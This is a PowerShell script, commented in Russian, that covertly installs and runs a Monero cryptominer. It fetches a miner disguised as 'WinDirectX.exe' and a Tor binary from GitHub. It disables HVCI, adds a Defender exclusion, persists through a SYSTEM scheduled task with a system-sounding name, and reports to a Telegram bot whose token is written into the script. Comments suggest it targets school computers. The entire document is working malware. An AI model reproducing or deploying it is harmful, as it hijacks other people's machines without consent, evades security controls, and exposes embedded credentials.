# 1. ПРОВЕРКА АДМИНА
if (-NOT ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
    $arguments = "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`""
    Start-Process powershell -Verb runAs -ArgumentList $arguments
    Break
}

# 2. СНИМАЕМ ЗАПРЕТЫ И ВЫКЛЮЧАЕМ HVCI
Set-ExecutionPolicy Bypass -Scope Process -Force
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\DeviceGuard\Scenarios\HypervisorEnforcedCodeIntegrity" -Name "Enabled" -Value 0 -ErrorAction SilentlyContinue

# ВКЛЮЧАЕМ TLS 1.2 (БЕЗ ЭТОГО НЕ СКАЧАЕТ С GITHUB)
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

# 3. КОНФИГУРАЦИЯ
$path = "C:\ProgramData\SystemLib"
$wallet = "429bPnUKuYBQQVHoap1jKTWwiPfGuKAqL7ggbTFFZdbA3LyKScc6EnP9fTVeig7jNqaF7CFhUk5eCU8S5d85gWqU6Zt6bhA"
$user = "Isfandiyor0112-star"
$tgToken = "8260191816:AAE2rSVeuDnNG8nt4V-3vGjtfil3_ksqMwE"
$chatId = "6881699459"

# 4. КОМАНДЫ ПРОФИЛЯ + ФУНКЦИИ (update, check, delete)
$profilePath = "$HOME\Documents\WindowsPowerShell\Microsoft.PowerShell_profile.ps1"
$profileDir = Split-Path $profilePath
if (!(Test-Path $profileDir)) { New-Item -Type Directory -Path $profileDir -Force | Out-Null }

$Functions = @"
function send-tg {
    param([string]`$msg)
    `$url = "https://api.telegram.org/bot$tgToken/sendMessage"
    `$body = @{ chat_id = "$chatId"; text = "[`$env:COMPUTERNAME]: `$msg" }
    try { Invoke-RestMethod -Uri `$url -Method Post -Body `$body -ErrorAction SilentlyContinue } catch {}
}
function check {
    `$p = Get-Process "WinDirectX" -ErrorAction SilentlyContinue
    `$t = Get-Process "tor" -ErrorAction SilentlyContinue
    `$status = if (`$p) { "МАЙНЕР: OK (" + [Math]::Round(`$p.WorkingSet64 / 1MB, 2) + " MB)" } else { "МАЙНЕР: OFF" }
    `$status += if (`$t) { " | TOR: OK" } else { " | TOR: OFF" }
    Write-Host `$status -ForegroundColor Green
    send-tg "Ручной чек: `$status"
}
function update {
    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
    Write-Host "--- ЗАПУСК ОБНОВЛЕНИЯ ---" -ForegroundColor Cyan
    send-tg "⏳ Начинаю обновление компонентов..."
    Stop-Process -Name "WinDirectX", "tor" -Force -ErrorAction SilentlyContinue
    Start-Sleep -Seconds 2
    try {
        Invoke-WebRequest -Uri "https://github.com/$user/sminers/raw/main/WinDirectX" -OutFile "$path\WinDirectX.exe" -UserAgent "Mozilla/5.0"
        Invoke-WebRequest -Uri "https://github.com/$user/sminers/raw/main/tor" -OutFile "$path\tor.exe" -UserAgent "Mozilla/5.0"
        Write-Host "✅ Файлы обновлены!" -ForegroundColor Green
        send-tg "✅ Файлы обновлены. Перезапускаю..."
    } catch {
        Write-Host "❌ Ошибка скачивания!" -ForegroundColor Red
        send-tg "❌ Ошибка обновления: `$(`$_.Exception.Message)"
    }
    Start-Process -FilePath "$path\win_start.vbs"
}
function delete {
    Stop-Process -Name "WinDirectX", "tor" -Force -ErrorAction SilentlyContinue
    Remove-Item -Path "$path" -Recurse -Force -ErrorAction SilentlyContinue
    Unregister-ScheduledTask -TaskName "WinSystemUpdate" -Confirm:`$false -ErrorAction SilentlyContinue
    Write-Host "Система удалена!" -ForegroundColor Yellow
    send-tg "⚠️ СИСТЕМА УДАЛЕНА С ПК"
}
"@
$Functions | Out-File -FilePath $profilePath -Force -Encoding utf8

# 5. ЗАГРУЗКА ФАЙЛОВ (Исправлено)
if (!(Test-Path $path)) { New-Item -ItemType Directory -Path $path -Force | Out-Null }
Add-MpPreference -ExclusionPath $path -ErrorAction SilentlyContinue

Write-Host "--- ПРОВЕРКА ФАЙЛОВ ---" -ForegroundColor Cyan

# Качаем Майнер (на Гитхабе он без расширения, на ПК будет .exe)
if (!(Test-Path "$path\WinDirectX.exe")) {
    try {
        Invoke-WebRequest -Uri "https://github.com/$user/sminers/raw/main/WinDirectX" -OutFile "$path\WinDirectX.exe" -UserAgent "Mozilla/5.0"
        Write-Host "✅ WinDirectX загружен" -ForegroundColor Green
    } catch { Write-Host "❌ Ошибка загрузки WinDirectX: $($_.Exception.Message)" -ForegroundColor Red }
}

# Качаем Tor (на Гитхабе без расширения, на ПК будет .exe)
if (!(Test-Path "$path\tor.exe")) {
    try {
        Invoke-WebRequest -Uri "https://github.com/$user/sminers/raw/main/tor" -OutFile "$path\tor.exe" -UserAgent "Mozilla/5.0"
        Write-Host "✅ Tor загружен" -ForegroundColor Green
    } catch { Write-Host "❌ Ошибка загрузки Tor: $($_.Exception.Message)" -ForegroundColor Red }
}



# 6. СОЗДАНИЕ ТИХОГО ЗАПУСКА (С ЛОГ-ФАЙЛОМ И ЗАЩИТОЙ)
# 6a. Создаем BAT-файл с проверкой процесса и записью лога
$cmd = "@echo off`n" +
       "tasklist /FI `"IMAGENAME eq WinDirectX.exe`" 2>NUL | find /I /N `"WinDirectX.exe`">NUL`n" +
       "if %ERRORLEVEL%==0 exit`n" +
       "timeout /t 30 /nobreak >nul`n" + # Задержка 30 сек для школьного инета
       "start /b /low $path\WinDirectX.exe -o gulf.moneroocean.stream:443 -u $wallet -p $env:COMPUTERNAME --algo rx/0 --tls --proxy=socks5://127.0.0.1:9050 --threads=6 --log-file=$path\miner.log"
$cmd | Out-File -FilePath "$path\run_cache.bat" -Encoding ascii

# 6b. Создаем VBS (запуск Tor и Батника)
$vbs = "Set WshShell = CreateObject(`"WScript.Shell`")`n" +
       "WshShell.Run `"$path\tor.exe`", 0, False`n" +
       "WshShell.Run `"$path\run_cache.bat`", 0, False"
$vbs | Out-File -FilePath "$path\win_start.vbs" -Encoding ascii




# 6.1 ПЛАНИРОВЩИК (ОТ ИМЕНИ SYSTEM)
$TaskName = "WinSystemUpdate"
if (Get-ScheduledTask -TaskName $TaskName -ErrorAction SilentlyContinue) { Unregister-ScheduledTask -TaskName $TaskName -Confirm:$false }
$TaskAction = New-ScheduledTaskAction -Execute "wscript.exe" -Argument "`"$path\win_start.vbs`""
$TaskTrigger = New-ScheduledTaskTrigger -AtStartup
$TaskSettings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable
Register-ScheduledTask -TaskName $TaskName -Action $TaskAction -Trigger $TaskTrigger -Settings $TaskSettings -User "SYSTEM" -RunLevel Highest -Force

# 7. ПИТАНИЕ И УМНЫЙ СТАРТ
powercfg /x -hibernate-timeout-ac 0
powercfg /x -monitor-timeout-ac 5
powercfg /x -standby-timeout-ac 0

# Запускаем только если майнер еще НЕ запущен
if (!(Get-Process "WinDirectX" -ErrorAction SilentlyContinue)) {
    Start-Process -FilePath "$path\win_start.vbs"
    Write-Host "🚀 Майнер запущен впервые." -ForegroundColor Green
} else {
    Write-Host "✅ Майнер уже работает, повторный запуск не требуется." -ForegroundColor Yellow
}


# 8. МОНИТОРИНГ В ТЕЛЕГРАМ (ОПТИМИЗИРОВАНО ПОД 15 ПК)
$Monitor = {
    param($pcName, $tgToken, $chatId)
    while($true) {
        # Считаем время работы системы (Uptime)
        $uptime = (Get-Date) - (Get-CimInstance Win32_OperatingSystem).LastBootUpTime
        $uptimeStr = "{0}д {1}ч {2}м" -f $uptime.Days, $uptime.Hours, $uptime.Minutes
        
        # Получаем среднюю загрузку процессора
        $cpuLoad = (Get-CimInstance Win32_Processor | Measure-Object -Property LoadPercentage -Average).Average

        # Проверяем процесс майнера
        $p = Get-Process "WinDirectX" -ErrorAction SilentlyContinue
        
        if ($p) {
            $mem = [Math]::Round($p.WorkingSet64 / 1MB, 2)
            $msg = "✅ СТАТУС: ОК`n💻 Нагрузка ЦП: $cpuLoad%`n⏳ Uptime: $uptimeStr`n📦 RAM: $mem MB"
        } else {
            $msg = "⚠️ ВНИМАНИЕ: МАЙНЕР ВЫЛЕТЕЛ! Пытаюсь перезапустить..."
            # Попытка реанимации, если вылетел
            Start-Process -FilePath "C:\ProgramData\SystemLib\win_start.vbs" -ErrorAction SilentlyContinue
        }

        $url = "https://api.telegram.org/bot$tgToken/sendMessage"
        $body = @{ chat_id = "$chatId"; text = "[$pcName]`n$msg" }
        
        try { 
            Invoke-RestMethod -Uri $url -Method Post -Body $body -ErrorAction SilentlyContinue 
        } catch {}
        
        # Интервал проверки (3600 сек = 1 час)
        Start-Sleep -Seconds 3600
    }
}
Start-Job -ScriptBlock $Monitor -ArgumentList $env:COMPUTERNAME, $tgToken, $chatId


# Уведомление о старте
$urlStart = "https://api.telegram.org/bot$tgToken/sendMessage"
$bodyStart = @{ chat_id = $chatId; text = "[$env:COMPUTERNAME]: 🚀 СКРИПТ АКТИВИРОВАН!" }
Invoke-RestMethod -Uri $urlStart -Method Post -Body $bodyStart -ErrorAction SilentlyContinue

Write-Host "--- ВСЁ ГОТОВО ---" -ForegroundColor Magenta
